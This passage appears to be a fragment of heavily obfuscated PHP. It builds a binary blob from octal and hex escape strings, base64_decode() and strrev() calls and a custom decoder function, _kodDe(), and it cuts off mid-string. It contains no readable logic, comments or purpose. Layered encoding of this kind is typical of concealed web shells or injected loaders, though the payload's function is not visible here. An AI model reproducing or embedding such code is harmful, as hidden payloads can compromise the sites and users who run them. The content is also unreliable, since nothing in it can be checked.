bI'."\0".'ÒØJÓ†ZÆ|2DÀ`').base64_decode('QZsLukU+EQ7NBzA4YWgOCBFgwBozdZtkgWkSHEdAcCOBQdsql7pZm1KIdgsiRJ95')."\104\322\262\334\0\343\65\3\62\33\12\275\210\260\135\123\165\72\253\217\206\314\277\277\23\260\166\70\251\162\226\76\147\261\52\327\303\313\162\257\243\65\2\117\277\201\235\171"."\236\74\142\171\331\66\54\350\42\204\27\100\174\255\24\333\30\17\250\115\33\225\41\257\32\24\262\223\207\201\261\220\376\11\271\257\240\204\375\174\245\137\42\214\33\115\153\203".strrev('=C€!Õ!ÛU—d ß9iKêŒ«›¼†õı‰VÕ#"fz“¿JÌ§R†TamdW9©)').base64_decode('X7D99t2XzTjbCnz1PTvo8/cujJKgy0RJEBy0sxhlp9AB2FZgUzRTTgZkHfCG8NYL')."\x11\xe4\x4d\xae\x55\x52\x5c\xa2\x11\x8f\xb6\xa5\x95\xe5\x9\x84\xe9\xc\x4b\xa5\x65\x54\x9c\x59\x21\xff\x58\xa6\xe2\xa9\x9b\x4d\x97\xd2\x4c\xd2\x45\x58\x33\xb3\x34\x66\x2d\x3a\x15\xd6\x36\xd7"."\xb0\x46\x6a\x3c\xc5\x5\xd0\x78\x3b\x11\x60\x41\xa5\x12\xc\xf1\x74\xcb\x93\x80\x81\x83\xc\x5f\x9c\x64\x2c\x2a\x21\xe\xce\x32\x50\x89\x9a\x3\xfc\x1a\x16\x93\xc3\x97\xce\xe2\xc4\xd2\xca\x50"."\x2a\x21\x23\x11\xc1\xfa\xe5\x69\x17\x7\xc5\xe\x63\x20\xa1\xe0\x6\x2\x12\x5d\x83\x11\x4e\x50\xec\x15\x29\xe8\x9d\x72\x1f\x44\xfa\x8e\x5b\x3c\x45\xdd\x86\x39\x61\x98\xb2\x44\x4b\xc4\x8a\x13"."\133\20\14\170\253\373\144\160\255\123\175\323\43\106\110\314\2\40\111\13\24\14\163\130\72\314\205\70\7\365\36\27\225\372\16\65\371\172\316\220\156\320\263\241\1\310\363\232"."\x2d\xe6\x8f\xa1\x21\x8c\xb\x84\x68\x10\x67\x11\x41\x29\x5b\x4e\x1b\x15\xf4\x8b\xa7\x8c\x84\x4c\x1c\x77\x82\x75\x58\xfe\xf4\x56\x4a\x83\xad\x1\xf2\xdb\x81\x6\x2e\xef\x50\xbe\x22\x18\x75\xb0"."\x4c\x14\x7\xa1\xed\x1f\x47\xd3\x83\x7e\xc8\x40\xd2\x56\x0\xcb\x12\xd1\xf\x3d\xe5\xd9\x65\x16\xc9\xc4\x40\xbd\x5c\x6c\x85\x2b\x1b\xfc\xbd\x12\xed\x79\x46\xb6\xa1\x39\xae\x63\x38\x3\x68\xd".base64_decode('VZIYcJzjRWi0JxGO39Gpic48+o1I+wI66uwQ3iLt+MCSzwovvZHS0ZihnKgtVZEm').base64_decode('5xbSIoz7xVnB5lXsMDHXYjsNig7hqVUr+4EBuHq4zbY4HcyPfX+mFsJo8vtJ31Et')."\315\207\207\274\250\210\222\312\370\11\15\137\254\57\50\26\302\163\316\320\50\46\112\326\262\105\303\14\331\364\64\13\41\366\1\356\224\3\15\22\55\46\320\314\72\207\234\13"."\x70\xfa\x6d\xf0\xad\xb3\x6b\x59\x88\x27\xb5\x43\x36\x6a\x59\x74\x48\x42\x71\x80\x1f\xc8\x95\x23\x3e\x6\x65\xa\x82\xd7\xe2\xa0\x4\x9\x59\x7b\x9\x25\x56\x32\x55\xd2\x18\x8e\x6\x8e\xa3\xcc"."\233\341\124\35\140\51\43\63\54\166\252\66\252\41\370\203\252\311\140\244\313\141\22\216\163\302\30\343\216\150\326\160\161\14\336\214\26\223\173\213\214\342\304\24\161\62\312\46".strrev('I)dÒ'."\n".'E"JµÇ!‘Kª5¢’ı$"'."\0".'•c=šıS©‡¤rtä@;KÓ“Í0#.âÅO\'')."\x54\x2a\xe5\xe2\x8b\x44\x7a\x84\xf6\x57\x96\x10\xcc\x62\xca\x48\x5e\x28\x4b\x78\x6f\xba\x85\x43\x98\xdb\x8\xc9\x78\x3a\x62\xdb\xc\x80\xe9\x30\xf1\x25\xe\x8a\x94\xa3\x30\x2e\x4c\xb1\xdd\x57"."\xed\xb8\xa2\x95\x47\x47\x85\xf6\x8\xad\xa\x37\x1c\xa2\xdb\x3f\xa4\x65\xb3\x9\x76\x91\x25\x7f\x57\x66\x95\xe5\x90\xd5\x2b\x22\xaa\x3c\xbc\x2a\x29\x54\x3d\x7b\xa4\x50\x10\xd7\xff\xfe\xf0\x94"."\105\350\266\227\13\311\61\123\26\153\43\214\57\273\216\253\26\307\231\34\171\333\171\11\165\77\31\357\105\325\123\223\54\123\40\71\261\214\325\303\350\224\157\311\33\246\356\360"."\303\332\166\252\341\254\377\317\264\161\345\314\343\35\62\25\270\340\64\111\142\215\265\330\106\165\231\203\340\142\131\201\262\370\21\136\101\230\0\161\40\5\124\327\103\122\45\111".strrev('«>roL¯:yJªr×„œ!r´Ÿœp8&´&tùıfYí K‘ğ>t¾Ú@òvÒı').strrev('uêÊxÁ¡o’0è“ß¬ş›04'."\0".'Î“óø†õxŞ»Ö÷èã|n‰å¯2Xjªa8')."\xd6\x61\x8f\xff\xd7\xde\xc7\x7f\xb4\x6e\xfe\x96\x60\xdd\x50\x47\xaa\x66\xda\x19\x9d\xfd\x3f\x7a\xbd\xe5\xea\xd6\xd3\x13\xb1\x13\x67\x2f\xe\xec\xfa\xf8\x97\x7\xfd\xdd\x3c\x77\x6c\x5d\xcd\x75"."\377\72\162\163\361\365\117\316\253\211\366\137\31\72\376\216\266\257\334\261\364\260\205\113\117\332\253\363\67\126\252\371\257\301\333\306\26\156\35\253\135\163\272\362\326\150\156\160"."\x6c\x30\xf7\x9d\xf\x57\xeb\x57\x7c\xf2\x97\x27\xe\xbc\xfc\x93\x7c\xc7\x5b\x5f\x38\x2f\x74\xf9\x5e\xbf\x1f\x7c\x69\x8f\xb9\xd7\x6d\xfc\xc5\x59\xb1\x9d\xbf\x5b\xba\x29\x73\x70\xf9\xa1\xc8\xcd".strrev('şÇí½âyŞƒßbx.j§œäükN”/iÅùÏŞÅôwİ´Îfdá¬hãxp/')."\373\217\77\333\130\174\262\24\177\156\151\360\355\27\232\376\175\347\11\352\313\273\346\356\365\306\71\73\276\71\176\161\271\375\375\43\326\56\172\122\137\136\347\44\177\275\350\223".strrev('gy¬×)Ëyı·s½ó[M×½ÛBõ~Ë±ö³¾l^«‚†äÿ³Ù\\Èq=¦Şñ')."\346\231\115\47\76\171\375\332\167\216\274\144\306\214\341\247\116\371\333\235\47\57\272\352\225\171\333\226\276\270\145\327\111\7\376\170\301\223\157\17\17\377\342\223\246\345\223\163"."\x66\x2c\xee\x7c\x6a\xb0\x7c\x66\x9d\xf3\x9f\x35\xdf\xdd\xff\xe4\x15\xd7\xae\xee\x3b\x74\xd3\xd0\x65\x57\x2e\xf8\xf8\xe4\x97\x6f\x5f\x7d\xe4\xb3\xc5\xdf\x4f\xae\x3d\xfa\x9a\xec\xcd\x3b\xe2\x7d".base64_decode('q7982JuLHxmd8dyhH585f90vH4vdd8aGeyb3zmye+fC/7ll2wNee3fBMYd0ni90v')."\357\167\364\253\127\44\237\171\353\313\173\265\26\376\274\327\27\216\175\352\303\65\173\176\365\262\232\145\175\263\37\355\274\376\153\65\153\76\171\264\161\263\371\365\313\16\150\216".base64_decode('rvzJ43vd+4tCTf7AA++94NFvvvzLmv/c+5VJ5ZG7Nu3eZ8W7px6+wPxh8pDDnl50')."\x56\x6f\xe8\xe2\xf7\xbf\x79\xd4\x81\x7f\x7f\x3b\x14\x3a\x68\xd9\x35\x1b\x16\xff\x70\xf5\xef\xdb\x1f\x39\x2d\x78\x53\x6e\x73\xf0\xa9\x86\xed\xc9\xbd\x13\x7f\xff\xe7\x37\x5e\xac\x6f\xdc\xae\xef".strrev('É÷º?=©ãy»¸».Ûæôd:{‹ÆÖq¯÷0òzö¿¦µí;» ÿ¼kïŸÃq')."\327\156\133\165\311\351\317\277\176\351\326\325\127\274\173\214\161\342\371\375\107\175\63\366\273\263\337\272\160\363\327\346\5\7\67\355\374\363\267\156\330\367\231\123\76\334\367\320"."\372\313\223\355\43\177\370\356\45\35\367\345\266\26\166\377\254\70\367\221\355\173\235\272\317\167\113\352\312\340\221\7\164\354\167\313\153\345\307\356\16\215\277\362\354\107\63\267"."\335\120\172\373\267\17\376\166\344\300\167\277\235\133\265\240\371\351\207\317\334\332\364\154\272\343\240\313\56\336\170\170\315\135\367\135\277\342\351\325\115\17\47\72\126\266\35\322"."\30\372\336\7\235\237\134\176\246\273\351\236\133\127\74\175\354\342\307\216\171\114\73\360\222\371\227\336\270\140\313\260\373\316\217\136\370\332\301\217\234\265\346\327\267\356\375\154".base64_decode('8erv/iR9SKYje920nwf2WHnyK4uPWHHro4H2D67+x0GP1D3f8/Wm7q/ebtasDP+2').strrev('¿‰ÕÕ{4\\½èÇ}8e~l6kÛ~^ÿåœİzÚ]ÅÂû©?ßGèú¿é­>>şî')."\234\263\345\115\147\353\360\257\107\316\70\147\217\236\256\17\356\376\301\222\373\36\76\355\265\207\237\77\344\244\363\316\157\71\365\52\373\13\67\76\173\176\371\302\133\232\357\162"."\137\271\73\175\310\41\373\237\75\162\316\143\137\170\354\342\43\277\377\245\331\327\277\77\367\343\73\354\333\137\152\372\335\267\202\17\55\274\261\230\377\343\312\33\276\163\357\242".strrev('£çİknË²ó¸»¿w§µÖım¯;]ËKzdü¯¿ö	àø~jşëÏy°~kõ-ÿ¾Úÿ')."\223\317\233\171\377\43\43\217\64\106\266\37\372\247\175\376\322\175\154\375\363\57\247\136\134\164\345\254\175\107\137\376\131\327\312\153\336\337\64\366\255\243\57\236\326\367\233\17"."\x36\x1f\xf1\xc6\xd0\xb\xab\x4f\x58\x15\x1a\x7c\x31\x30\xfb\xc2\x8f\x2e\xaa\xff\xf6\x71\xfb\xbf\xfd\x62\xd0\x7d\xfb\xe0\x75\x87\x7d\x38\x9c\x6b\xff\xdd\x63\xda\x55\x5b\x73\x7f\x78\x6c\xff\xf7"."\376\64\261\317\362\117\27\266\276\176\137\131\377\303\77\337\277\356\235\277\345\116\231\367\170\343\246\102\352\344\17\317\157\334\361\332\311\117\245\147\74\330\76\357\326\67\217\333"."\x15\x5c\x7d\xc4\xea\x99\x1d\xfd\xf3\x56\x5e\x7c\x50\xe7\x96\x69\x57\xe\x2c\xd8\x7a\x75\xee\xab\x7b\xb5\xee\xb5\xed\xb7\xd7\xf\xed\x7d\xa7\x99\xb8\x73\xcd\xb7\xe7\x6e\xa9\x3d\xef\xce\xe7\x77"."\xdd\x7d\xa7\x79\xd3\x9\xef\xbe\x70\xdf\x95\xf\xed\xb3\xe0\x9c\xf8\x29\x67\x6f\x3b\xe1\x8a\xc7\x4f\x5e\xf9\xd2\xf4\x5d\xef\x3d\x7f\x69\xec\xe9\x2f\xfc\x5\xad\xe8\xf5\x47\xdf\x76\xe6\x63\x23"."\xe6\xc4\x57\x2e\xf9\xbb\xb9\x73\x95\xbb\x6c\xcf\x6\xed\xed\xf\xde\x3b\x62\xcf\x9e\xb3\x37\x3f\x3b\xff\xd2\xc0\xc1\xfb\xa4\x1f\x38\x65\xf5\x7b\x5b\x6f\xbd\xa2\x21\x31\xfb\x8a\xaf\xbc\xb6\x60"."\x2c\xaa\x3e\xb7\xff\x81\xc7\xff\xe5\x71\xe5\xee\x7\xcf\x5c\x7c\xdf\x65\xbf\xb9\xaa\xb3\xe7\x94\xa7\x3e\x3c\xe9\xaf\x5f\xfa\xf0\x85\x62\xe4\xd5\xad\xd7\x1d\xf6\xcf\x8b\x1e\x7e\xe7\xf5\x87\x9f"."\273\351\224\336\221\201\7\117\270\150\327\125\307\357\363\315\37\377\147\347\113\57\135\361\235\211\17\336\331\165\350\55\127\134\376\351\337\336\236\367\214\332\167\377\211\377\171\377"."\27\357\206\23\352\356\167\77\72\351\320\301\53\166\277\367\311\216\33\76\134\262\373\235\363\17\177\345\345\243\267\174\360\357\45\107\214\217\235\170\361\107\227\35\362\152\376\311".strrev('ÜÚsX^×çŸu}çãöøıü_‰†ĞÑ{¿Ô¯µwûšsïÇàşÍ_íåùP¾G').base64_decode('6x7bvdVt2nVz2+9u7ypd/8CpL80v1l908Bnfu6CtruO8Y1L3ZL+jHnLoRa8cfOP7').strrev('¥ÿo<ïÕû??®£\\7_ınŒf¸ëıoÏÂõú¿&w¡÷q_OÊ|;qûs½ÿ')."\173\134\366\347\35\357\34\272\161\336\346\13\377\161\321\57\107\353\366\177\354\371\357\37\371\317\345\47\155\277\144\217\31\63\377\173\315\271\343\275\233\216\50\75\360\345\356\213"."\x96\x1e\xf7\xfd\x87\xbb\x4e\xbe\xe5\xac\x15\xe7\xfd\xe0\xec\x3f\x9c\x1b\xb8\x25\x63\xfd\x7c\xec\xc9\xc9\xef\xbd\x9b\x3c\xf7\xa7\xef\x3d\xdc\xf8\xb5\x47\xe7\xce\xbd\x6b\xef\x45\xdb\xae\xdd\x70"."\165\166\317\57\327\276\74\376\224\365\373\17\106\237\132\260\373\303\346\275\167\175\351\265\137\57\353\70\251\174\312\100\327\25\253\336\173\342\241\363\346\365\376\372\157\227\76\264"."\366\372\165\177\177\352\316\215\177\173\150\264\376\244\301\332\215\333\256\114\275\375\364\137\17\273\351\275\13\6\36\372\166\374\205\177\377\152\345\117\123\317\114\224\157\273\42\263"."\xf1\xef\x3f\x9c\xf5\x71\xb6\xe9\x32\x77\xde\xf0\x86\x5f\xdd\xf4\xfc\xd\x7b\xd\x1e\x3b\xbc\x60\x70\xdd\x70\xf9\xf6\xe1\xdb\xcc\xf6\x4d\xb7\x9f\xe8\x18\x23\x57\xa5\x6f\x6a\x79\x69\x70\xff\x4d"."\117\36\364\161\307\307\201\365\33\357\371\370\203\67\157\120\306\327\75\72\176\305\217\366\355\75\373\212\127\376\24\73\105\75\170\277\31\37\376\370\150\367\254\365\177\274\275\357"."\xd8\xe1\x3b\x36\x6f\x3c\xe8\xcc\x5d\x4b\xf5\x93\xdf\x7b\xb8\x36\xfa\x8f\xd1\xa6\x3f\xf5\xf4\xff\xe1\xc0\xa1\x3\x36\x9c\x7a\xff\xf2\xff\xbe\x75\xf9\x11\xbb\x6f\x9c\xd7\x79\xd1\x7e\xd7\x7c\xf2"."\301\153\357\325\34\170\365\163\333\267\55\332\165\334\242\311\263\224\203\367\216\334\66\355\325\315\361\340\235\377\171\355\130\265\71\232\174\360\343\224\173\360\226\215\43\323\216\376"."\xb2\xfd\xd4\xe9\x3f\xd8\x34\x30\x9c\x5b\xb0\x63\x69\xdb\x3\xf\xbd\xfc\xf4\x5e\xd1\xbf\x7d\xfb\x3b\xe3\x6f\x2d\x7d\xe7\xd9\x15\x75\xeb\x1f\x7e\x70\xe0\x45\x6b\xda\xd3\x5f\x3b\xf6\xce\xc3\x7"."\x9e\x58\x3a\x71\xe8\xe1\x7\x3d\x96\xb8\xe5\x85\xf3\xaf\xbb\x78\x5e\xef\x1\xf3\x1e\x1e\xcd\xbc\x75\xed\xe0\xbf\x9e\xdf\xbb\xf1\xf2\x27\xee\xda\xfb\x99\xbe\x87\xbf\x74\xd5\xed\x4f\x9f\xfa\xd2"."\223\17\356\165\173\172\255\262\367\171\367\132\377\134\263\373\34\367\374\153\317\371\103\240\177\316\111\307\175\272\247\161\356\155\37\354\167\374\214\375\377\362\316\344\341\203\337\170".base64_decode('tOWQUNchf7j/5G3xM0+fPXTdyifqvrryhn9d+shZr4xm/rV21thz2k83Rn7zs733')."\x3e\xec\x91\xbd\x17\x8c\x7d\x63\xc7\x4d\xaf\x3f\xf4\xf1\xe8\xbd\xcd\x47\xfd\xf6\xeb\xcf\xf\xdd\xf4\xaf\x47\x9f\x6f\x73\x2e\x38\x74\x4b\xec\x9a\xfc\x2b\x63\x73\x7f\xf5\xd2\xbe\xf\xce\x7b\xd8".base64_decode('/vmtd6Zu+uELh/7w20tOva+872M/T6Rv7N3Z54zUPLC87eqFgae6D3n14tnd619+').base64_decode('/fZLV+wxvua5/gUHuOFvfPGIe/e778Wv3nHIj+9ffuSDdQ8eevmNM95Z9I9DO6+5')."\x76\xe5\x2f\xb7\xbd\x70\xd1\xf4\xe4\x5d\x7b\x9d\xd9\xd3\x75\xfe\x4b\xa1\x77\x36\xa6\xae\xeb\x7c\xe1\xf4\xf\xdf\xfc\x74\xd1\xba\x8f\x77\xbc\xb4\x6b\xc9\xd6\x7f\xbc\xfe\xe2\x35\x47\x9e\x58\xfe"."\xd7\x3\xaf\xfe\xf8\xc4\x8f\x3e\xf8\x67\xfb\x33\xbf\xde\xfd\xd1\x2e\xeb\x84\xf5\xf6\xbf\xfe\x7c\xe6\xad\x5d\xea\xa2\xd\x27\xee\xbe\xe2\x96\x47\x5e\xbd\xe5\x53\x7b\xf7\x3b\x3b\xfe\x59\x7b\xe4".base64_decode('pt0fH3jNkd8Z3/38ktDiTz/69NP/xNNm3e93fXDOT888r/HNbZc+8/DV42+8f/bd')."\xbf\x78\xe5\xe5\x5d\xdf\x7b\x66\xde\xf4\xe7\x8f\xdf\xe0\xdc\xb0\x65\xdb\x6f\x5f\xf9\xe3\xf0\x9d\xb\xff\x78\xc2\x77\x3e\xfd\xd3\x5f\x76\x9f\xb4\x31\x7f\xe5\x61\xbf\x3f\xfc\x9c\x1b\x37\x37\x6e"."\x39\xe2\x9d\xae\x45\x57\x7c\xe9\xf1\xdf\xbe\xf4\xc9\x31\x77\xdf\x7f\x7e\xf8\xc6\x9b\xbf\xf1\xe2\x8a\x4b\xb6\x2e\xf9\xf2\x8a\xd7\x6e\x56\xae\x3b\xe3\x99\x6f\x66\xe\xfd\x4b\x60\xc9\xc9\xcf\x6d"."\xc9\xfd\x75\xed\xb3\x85\x6f\xa8\x57\x3e\xf1\xe0\xf9\x5b\xb6\xdc\xb0\xce\xb9\xe4\xb7\xb7\x1e\xf4\xe2\xda\x3d\x37\xbe\x61\xed\x71\xc9\x3e\xef\x4f\xdf\x74\x30\xb3\xb6\x68\x6c\x0\x99\xec\x2c\xf6"."\61\147\16\220\103\331\201\202\243\17\2\221\5\211\63\147\201\376\170\343\174\370\230\337\70\227\176\314\205\113\332\71\363\346\321\217\361\321\114\311\140\326\23\171\315\35\57\14".base64_decode('MrlHvjBYZhRa1jbd4Qxkm7lgAXSH/gwZA1ahPMEaB559whgu2iCXs0tGzpkACQuo')._kodDe('K4AFjf8/uPtUuO1J+akNuGWrRI5EI9Bofl4fQgGPcythjp5pFjyMv1q+PI1ztICxNQ==').strrev('c>¼»a@pĞlmU â"ùé³èq¼’ás¦pÄÓP¹‚ù„3¨Äøæl†T')."\233\77\27\146\75\343\216\24\106\15\246\223\77\74\124\32\235\230\204\372\335\122\171\330\202\141\317\132\0\365\117\344\307\155\56\263\313\215\15\25\120\203\40\70\30\314\332\345"."\161\326\377\102\116\63\307\140\144\13\346\303\54\317\141\303\66\47\6\207\46\331\72\262\333\166\3\325\346\60\335\167\326\136\161\170\150\62\233\203\213\376\321\314\330\310\40\233".base64_decode('iFlQ6YIFMOEL5sGYJjOmkWVcwSw2MwOThdExdve9oBFiG2fNZwAJcDR3AfuYD3nm').base64_decode('zYaOz14ALRQnnEKGcf+NjQAHmcFiOZ9l/KU5MjE0AHOfyea0chHm3p2YHBop2gzI').strrev('8+Èİse'."\r".'UÏa±g"Ã¹Ì™ØÎçúÏfY	;3!·bdÔazc÷ ').base64_decode('WW3cZNMKVc1js+daA+bYJJP7Tw6YE2MMuGfBqCdH3KFhtn0GMyNGfnKC1QJZ9Oxk')."\161\310\2\316\131\67\313\331\211\41\166\317\60\76\226\51\232\43\154\211\355\314\320\50\164\154\130\53\345\7\330\215\103\336\50\133\343\372\44\3\146\350\334\210\145\32\343\5"."\150\254\74\62\236\325\231\170\174\336\114\310\342\350\345\201\11\27\366\136\343\134\210\235\313\346\144\240\74\204\46\213\155\222\5\263\30\100\102\277\107\363\231\322\200\3\245\13"."\23\43\346\120\26\366\334\374\206\5\154\347\316\143\153\222\231\34\236\200\5\135\300\20\123\316\316\217\351\154\331\112\332\360\344\30\333\114\103\223\243\331\11\263\310\326\160\36".base64_decode('jy0NDML+mT8LliM/nsuUJ0yeZbBcgICVLw/nGOtZyppi8kuGPmAXoT9zGqH+mTPh')."\143\316\134\200\206\311\61\307\310\17\145\31\50\103\213\163\146\316\144\230\200\1\342\34\206\140\40\145\136\43\214\161\116\3\344\51\116\152\372\150\266\304\222\241\45\125\313\201"."\252\173\314\224\143\140\202\360\115\310\240\356\252\240\77\12\263\263\54\222\212\265\250\335\21\246\365\250\225\112\141\47\73\354\204\261\116\202\61\252\307\215\201\60\266\43\301\146"."\155\41\156\151\221\311\353\231\141\125\33\260\154\227\111\216\312\330\16\1\346\163\115\21\42\227\151\231\141\46\302\106\254\273\133\166\174\31\270\175\221\31\52\152\46\127\4\352"."\0\255\225\214\254\223\56\147\30\326\165\246\315\314\364\245\205\246\211\123\46\26\35\20\157\24\165\41\213\247\267\37\254\244\220\65\140\301\216\244\253\202\203\51\271\226\214\351".base64_decode('Ssko5ElNuZbNtWOo3l0I9zDkHXMDrHmVi1OQMjvOmGXD1Axb2UzBKmc9tWYHPHXy')."\130\46\34\361\247\344\246\210\107\365\170\124\213\131\234\147\262\6\310\352\251\162\40\304\246\173\100\132\131\172\101\340\152\316\160\110\216\16\312\251\206\211\172\121\50\204\274\346"."\221\52\371\3\163\100\115\360\34\175\244\254\233\342\322\335\31\226\46\36\333\65\366\164\253\351\110\152\205\244\234\210\355\356\30\70\251\2\342\245\141\211\32\244\171\224\127\320"."\73\5\14\102\336\272\145\353\216\163\57\336\171\321\255\73\317\276\171\307\175\27\274\165\363\255\73\266\135\204\202\333\357\71\147\307\315\227\277\175\311\51\333\357\71\173\373\75".base64_decode('331r4x277j9rx7m3vHXSth2brt3xk43bt25764GNb1575vZ7btq56fQdp9y1fevF').base64_decode('O067csfGc3decPb2bZtQ/p2niZpRth03/QiXvf/7O+65562rruWpu+7/HuAPQOvt')."\272\213\315\25\231\306\31\231\35\145\261\2\0\251\73\41\245\273\240\243\31\126\310\46\305\352\151\156\136\267\25\227\250\251\151\350\257\151\231\101\12\160\324\24\324\121\14\23"."\47\53\154\155\102\34\50\323\172\261\204\101\13\146\51\114\315\305\74\372\352\22\374\125\233\146\232\120\5\254\360\134\213\265\252\303\237\160\245\210\145\225\112\116\103\21\331\46".base64_decode('JYeKKczqQ3Et9o1O/pGqbVVfVt4NtrSMwDUsIcmGjknWB/TaqAKkyK7yogTPfvMi')."\x13\x39\xc9\x3b\x13\x20\x6a\x26\x1a\xf\x1\x85\x76\x25\xa0\x90\x7b\x6e\xc5\x6b\x1b\x89\x35\x18\xd8\x19\x2d\xef\x31\xb9\xfb\xb6\x5e\x2a\x48\x37\x5e\xa5\x89\xaa\x93\x28\xf7\x46\xbe\x64\xf7\xd"."\x2d\x55\x65\x1a\xf9\xe0\x3c\x89\x68\x5f\x97\xdd\x2a\x19\xe5\xd9\x96\x45\xdb\x86\xd5\x52\x40\x88\x4e\xdc\xcc\x12\x1d\x4\x31\xc\x1a\x14\x22\x75\xd4\x10\xc7\x93\xb6\x9e\x65\xc7\x7a\x51\x2f\x92"."\x9c\x8c\x9d\x20\x82\x7c\xae\xcf\x9d\x41\x5b\xc0\xf6\xdc\xc7\x2d\x5a\x52\xca\x97\xb0\x65\xb9\xbb\x70\x9\x58\xb0\xc2\xfd\xa6\x2a\xb5\xb\xdf\xc2\x58\x46\x8e\x2d\xf8\xef\xf8\xf8\x86\x69\x5d\x26"."\331\167\343\154\115\301\140\120\222\125\13\105\72\374\5\325\211\273\157\24\27\305\273\171\252\370\126\256\21\202\266\371\340\240\356\270\115\304\356\114\231\241\240\216\316\17\65\242"."\17\262\41\346\204\346\241\117\62\113\260\211\373\140\346\312\16\63\6\231\26\232\15\304\212\263\20\324\131\26\22\134\322\54\165\37\342\105\51\164\274\263\130\364\211\262\44\313".base64_decode('Jl7hJu+YdTMrFVqoZVypVjUHkxoS86HNEOl69ihYGGmWxiADK9vpXXc0/iAHBbS8')."\210\134\310\72\104\15\27\116\34\250\322\221\114\162\223\2\212\160\161\62\135\237\121\324\225\227\274\204\110\22\223\353\337\72\5\215\335\235\72\210\116\61\114\235\303\137\331\221".base64_decode('DRJ0sZ2x5rqKTnZ2BiLIVbMGZI3HlqmtsaQop5bKfpJN9ogQ6Y6pqVRCIuCIPeBq').base64_decode('dUWiVW1JJFbEAChhGZokvIntx8QdOg4JOzJ87SRr0MmECTZZx4dvSgE9VAT9LR2R')."\x24\xd7\xfe\x9f\x13\x6a\x8\x35\x8a\xbc\xa8\x41\x15\x1b\x41\x34\x33\xf3\xd8\x54\x3a\x92\xac\xe2\xb8\x80\x3a\x34\x80\x25\x2\x27\x6\x50\xa0\x23\xb1\x4a\x69\x49\xc4\x7b\x3a\xbb\x52\xd4\x5e\x9f"."\xc6\x77\x25\xa4\x74\xa2\xe3\xd\xc9\xcc\xad\x41\x65\x32\x54\x1f\xed\x8e\x47\x5a\xa2\x4a\xac\x2b\x9d\x60\x46\x1c\x5c\xcd\x96\x98\xef\xa4\x78\x98\x4d\x81\xed\xe8\xdc\x6d\x1\x94\xa7\x1\xd9\xc4"."\110\256\221\327\4\100\335\33\250\355\253\351\233\336\127\327\127\277\66\324\347\364\207\245\223\314\220\227\7\2\335\255\60\274\46\376\225\165\140\73\167\246\122\307\201\115\132\42"."\x19\x69\x89\xb3\xae\x20\x72\x1e\x3e\x13\x2d\x31\xfa\xf1\xe6\x85\x5b\xb6\xdf\x77\xce\x9b\x97\xdd\xbc\xe3\xf4\xb3\x51\x45\x3b\x2f\xfd\xfe\xce\x1f\xde\x85\x8\x17\x4c\xac\xdc\x7c\xd6\x9b\x3f\x3f"."\147\347\205\267\354\74\13\210\14\345\255\133\356\336\276\355\201\67\57\274\166\307\315\77\332\171\361\275\157\136\172\62\115\170\373\272\55\73\316\270\226\167\114\171\373\202\237\357"."\x3c\xe7\xa7\x9c\x80\xa1\x74\x4b\x0\x95\x7e\xfb\x94\xb3\xdf\xdc\x76\x33\x26\x5f\x36\x7f\x77\xe7\x9d\x67\xee\xdc\x74\xf6\x8e\x33\xae\xda\x71\xc9\xb5\x6f\x9e\x73\xcb\x8e\xab\x4f\xda\x71\xea\xd9"."\x6f\xdd\x72\xd1\x51\x7e\x40\xa2\xe1\x5e\xb6\x14\x60\xd6\x19\x3e\x1\x5b\xb1\xd2\xe9\xed\x73\x66\xe0\xa9\xad\x47\xbf\x75\xd8\x26\x4\xfd\x32\xd5\x76\xa2\xee\x7c\x5c\x4f\xb4\xab\x25\xea\xb7\xb1"."\222\203\340\363\141\72\205\20\252\317\3\264\246\3\76\43\130\230\230\216\67\327\116\331\213\365\260\376\122\247\244\316\264\106\123\55\311\330\262\50\130\35\360\205\232\106\250\55"."\x50\xe6\x40\xb1\xa9\xe4\x4a\xfe\xcd\xcd\xa\x2b\x7c\x74\x28\x75\xc\x98\xeb\x15\xcf\x40\xb4\x50\xc6\x2a\x94\x8b\x26\xe9\xac\x52\x83\xd5\x57\x6a\x2\xf8\x44\x22\x6\x5f\x4a\xd\x3e\x51\x51\x84"."\x9e\x41\x5b\xaf\xe\x1b\xf6\x13\x3d\xe5\xda\x35\xb5\x81\x86\x40\x63\xbd\x2\xe\x3c\x68\x9\x70\xdb\xa1\xd4\x80\xf2\x3b\x2f\xe7\x69\x24\x30\xe0\x9\x35\x6\x1a\xea\x95\x9a\xd2\x70\xd\xf4\x4b"."\314\53\352\275\112\163\72\212\26\250\203\16\313\335\25\171\21\66\163\134\133\63\20\172\123\62\1\36\305\313\243\137\217\53\216\114\110\224\240\353\204\162\370\343\224\110\127\253"."\67\47\365\340\321\135\113\24\101\63\41\227\173\10\140\313\134\133\257\14\200\55\107\225\104\122\314\63\31\315\236\311\250\233\1\170\242\273\235\257\67\65\324\120\250\35\37\355".base64_decode('luawhYJYslQ4lq4Wy2uhYaDFofnRB0/BJg28JoSOeAJbQRzPF7FKGnGtUkMpQjrO').strrev('.İ +g€ñS¦*€<Ó³Ì	)å'."\n".'–é£-‚Ìw	¤aY`ÀÇÃ\\èô¸PÈ3¢')."\x18\x21\xec\x4b\xf2\xc5\xba\xda\x12\xc9\x4e\x6a\x89\x97\x6a\xe9\x88\x76\x46\x42\x80\xc4\x29\x24\xd0\xfc\x98\xee\x52\x9a\x95\x5a\x8c\xf9\x68\x54\xad\x67\xfa\x49\x43\x6c\xca\xd2\xa4\x55\xb4\xaf".base64_decode('VBcRUXQWSoPQGVh9hdhYa6RIcy11hgBVcg9CiWRaRRMA6FnCurXSaSHpsGODslHG')."\17\344\20\125\144\61\37\20\331\1\46\52\107\225\343\72\133\22\135\155\61\146\164\330\12\334\166\51\153\171\62\265\46\143\330\332\36\332\127\130\125\222\251\47\12\10\325\21"."\x14\x28\x8d\x65\xf9\xb7\x30\x1c\xc7\x9\xfc\xcc\x47\x1\x71\xe4\xa3\x0\x3f\x6c\x70\x2e\xc9\x23\x12\x6e\x3f\xd5\xc5\xbf\x5\xe1\x8b\x2\x3d\x29\x66\x6c\x82\xb1\xef\xaa\x56\xfe\xdd\xc1\x2d\x86"."\161\102\42\51\5\42\311\110\147\212\7\223\253\270\361\12\217\243\106\54\152\127\117\247\300\370\361\310\112\4\54\11\101\240\60\154\135\27\232\276\244\276\217\332\5\322\117\372"."\263\224\205\260\255\124\377\272\306\200\62\167\103\75\344\141\226\164\252\233\67\114\106\171\342\126\216\213\253\361\104\73\15\23\117\115\121\63\53\170\23\245\127\101\144\160\132\220"."\301\16\73\272\370\156\120\20\14\53\324\330\130\351\112\254\212\10\347\77\122\2\304\10\137\100\341\23\172\373\306\372\102\210\130\160\326\12\73\277\326\145\12\43\103\132\1